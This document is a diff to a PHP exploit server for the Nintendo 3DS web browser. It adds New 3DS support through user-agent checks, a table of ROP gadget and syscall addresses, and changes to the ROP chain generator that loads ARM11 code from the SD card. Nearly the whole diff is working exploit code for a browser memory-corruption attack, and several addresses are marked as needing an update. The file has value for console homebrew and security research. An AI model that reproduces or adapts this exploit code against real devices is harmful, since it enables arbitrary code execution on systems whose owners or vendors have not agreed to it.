@@ -24,17 +24,17 @@ if($getbinselect==3)
 }
 
 $ua = $_SERVER['HTTP_USER_AGENT'];
-/*if(!strstr($ua, "Mozilla/5.0 (Nintendo 3DS; U; ; "))
+if(!strstr($ua, "Mozilla/5.0 (Nintendo 3DS; U; ; ") && !strstr($ua, "Mozilla/5.0 (New Nintendo 3DS"))
 {
 	header("Location: /");
-	//echo "This only supports the Nintendo 3DS main web-browser.\n";
+	//echo "This only supports the Nintendo (New3DS)3DS main web-browser.\n";
 	writeNormalLog("RESULT: 200 INVALID USER-AGENT, REDIRECTING");
 	return;
-}*/
+}
 
-$browserver = 4;//-1;
+$browserver = -1;
 
-//browserver titlever sysver
+//old3ds: browserver titlever sysver
 if(strstr($ua, "1.7412"))//1.7412 v6/2.0.0-2
 {
 	$browserver = 0;
@@ -52,6 +52,12 @@ if(strstr($ua, "1.7412"))//1.7412 v6/2.0.0-2
 	$browserver = 4;
 }
 
+//new3ds: Mobile-NintendoBrowser-version titlever sysver
+if(strstr($ua, "1.0.9934"))//1.0.9934 v10 9.0.0-20
+{
+	$browserver = 0x80;
+}
+
 if($browserver == -1)
 {
 	echo "This browser version is not recognized.\n";
@@ -59,7 +65,7 @@ if($browserver == -1)
 	return;
 }
 
-if($browserver != 1 && $browserver != 2 && $browserver != 3 && $browserver != 4)
+if($browserver != 1 && $browserver != 2 && $browserver != 3 && $browserver != 4 && $browserver != 0x80)
 {
 	echo "This browser version is not supported.\n";
 	writeNormalLog("RESULT: 200 BROWSERVER NOT SUPPORTED");
@@ -429,6 +435,70 @@ else if($browserver == 4)
 	$APT_PrepareToDoApplicationJump = 0x00299fb8;
 	$APT_DoApplicationJump = 0x0029953c;
 }
+else if($browserver == 0x80)//new3ds
+{
+	$CODEBLK_ENDADR = 0x00422000;
+	$OSSCRO_HEAPADR = 0x0810e000;
+	$WEBKITCRO_HEAPADR = 0x083cc000;
+	$APPHEAP_PHYSADDR = 0x2b000000;
+	init_mapaddrs_cro();
+
+	$STACKPIVOT_ADR = 0x00279a10;
+	$THROW_FATALERR = 0x001f10fc;
+	$COND_THROWFATALERR = 0x00261148;
+
+	$ROP_POP_R0R6PC = 0x001de9f0;
+	$ROP_POP_R0R8PC = 0x00309fdc;
+	$ROP_POP_R0IPPC = $WEBKITCRO_MAPADR+0x001b2d04;
+	$ROP_POP_R0PC = 0x002954e8;
+	$ROP_POP_R1R5PC = 0x001dbfd0;
+
+	$ROP_STR_R1TOR0 = 0x002258a4;
+	$ROP_LDR_R0FROMR0 = 0x001f6a60;
+	$ROP_STR_R1_TOR0_SHIFTR2 = 0x00332a14;//needs updated
+	$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00101214;//needs updated
+	$ROP_ADDR0_TO_R1 = 0x0027a2c0;
+
+	$ROP_LDMSTM_R5R4_R0R3 = 0x001d3f04;//needs updated
+
+	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00295b8c;//Same code as browserver val3.
+
+	$ROP_STMR0_R0PC = 0x001bb4cc;//needs updated
+
+	$SRVPORT_HANDLEADR = 0x003d9f80;
+	$SRV_REFCNT = 0x003d9da8;
+	$srvpm_initialize = 0x001ea3cc;
+	$srv_shutdown = 0x0028c9e4;//needs updated
+	$srv_GetServiceHandle = 0x001e9ce4;
+
+	$svcGetProcessId = 0x0026a608;
+	$svcSendSyncRequest = 0x001ea320;
+	$svcControlMemory = 0x00261eb8;
+	$svcSleepThread = 0x002d6a5c;
+
+	$GXLOW_CMD4 = 0x002a08d0;
+	$GSP_FLUSHDCACHE = 0x0029c02c;
+	$GSP_WRITEHWREGS = 0x002968bc;
+	$GSPGPU_SERVHANDLEADR = 0x003da3d0;
+
+	$IFile_Open = 0x0022fe08;//needs updated
+	$IFile_Close = 0x001fdba4;//needs updated
+	$IFile_GetSize = 0x00207514;//needs updated
+	$IFile_Seek = 0x00151694;//needs updated
+	$IFile_Read = 0x001686dc;//needs updated
+	$IFile_Write = 0x00168764;//needs updated
+
+	$FS_DELETEFILE = 0x001683c0;//needs updated
+
+	$FSFILEIPC_CLOSE = 0x0027ec60;//needs updated
+	$FSFILEIPC_READ = 0x0027ec08;//needs updated
+	$FSFILEIPC_GETSIZE = 0x0027ecec;//needs updated
+
+	$OPENFILEDIRECTLY_WRAP = 0x0027b600;//needs updated
+
+	//$APT_PrepareToDoApplicationJump = 0x00299fb8;//needs updated
+	//$APT_DoApplicationJump = 0x0029953c;//needs updated
+}
 
 if($browserver < 3)
 {
@@ -443,7 +513,7 @@ if($browserver < 3)
 	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0xed0;
 	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0xa28;
 }
-else
+else if($browserver == 4)
 {
 	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x2f9f0;
 
@@ -458,13 +528,43 @@ else
 	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0xec8;
 	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0xa28;
 }
+else if($browserver == 0x80)//new3ds
+{
+	$WKC_FOPEN = $OSSCRO_MAPADR+0x18ae48;
+	$WKC_FCLOSE = $OSSCRO_MAPADR+0xd492c;
+	$WKC_FREAD = $OSSCRO_MAPADR+0xd4934;
+	$WKC_FWRITE = $OSSCRO_MAPADR+0xd4944;
+	$WKC_FSEEK = $OSSCRO_MAPADR+0xd475c;
 
-$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x190;
-$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x308;
+	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0x4db5bc;
+	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0x4db124;
+	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0x4db684;
+	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0x4db12c;
+}
+
+if($browserver < 0x80)
+{
+	$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x190;
+	$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x308;
+}
+else if($browserver >= 0x80)
+{
+	$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x4da9cc;
+	$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x4da9ac;
+}
 
 $STACKPIVOT = genu32_unicode_jswrap($STACKPIVOT_ADR);
 $POPLRPC = $STACKPIVOT_ADR + 0x18;//"pop {lr}" "pop {pc}"
-$POPPC = $STACKPIVOT_ADR + 0x1c;
+
+if($browserver < 0x80)
+{
+	$POPPC = $STACKPIVOT_ADR + 0x1c;
+}
+else
+{
+	$POPPC = 0x001de80c;
+}
+
 $NOPSLEDROP = genu32_unicode_jswrap($POPPC);//"pop {pc}"
 
 $DIFF_FILEREAD_FUNCPTR = 0x080952c0+8;
@@ -1198,7 +1298,7 @@ function generateropchain_type1()
 
 function generateropchain_type2()
 {
-	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, $APT_PrepareToDoApplicationJump, $APT_DoApplicationJump, $arm11code_loadfromsd;
+	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, /*$APT_PrepareToDoApplicationJump,*/ $APT_DoApplicationJump, $arm11code_loadfromsd;
 
 	$LINEAR_TMPBUF = 0x18B40000;
 	$LINEAR_CODETMPBUF = $LINEAR_TMPBUF + 0x1000;
@@ -1285,8 +1385,8 @@ function generateropchain_type2()
 	$databuf[13] = $IFile_Read;
 	$databuf[14] = $IFile_Write;
 	$databuf[15] = $GSP_WRITEHWREGS;
-	$databuf[16] = $APT_PrepareToDoApplicationJump;
-	$databuf[17] = $APT_DoApplicationJump;
+	$databuf[16] = 0;//$APT_PrepareToDoApplicationJump;
+	$databuf[17] = 0;//$APT_DoApplicationJump;
 	$databuf[18] = 0x2;//flags
 	$databuf[19] = 0x0;
 	$databuf[20] = 0x0;
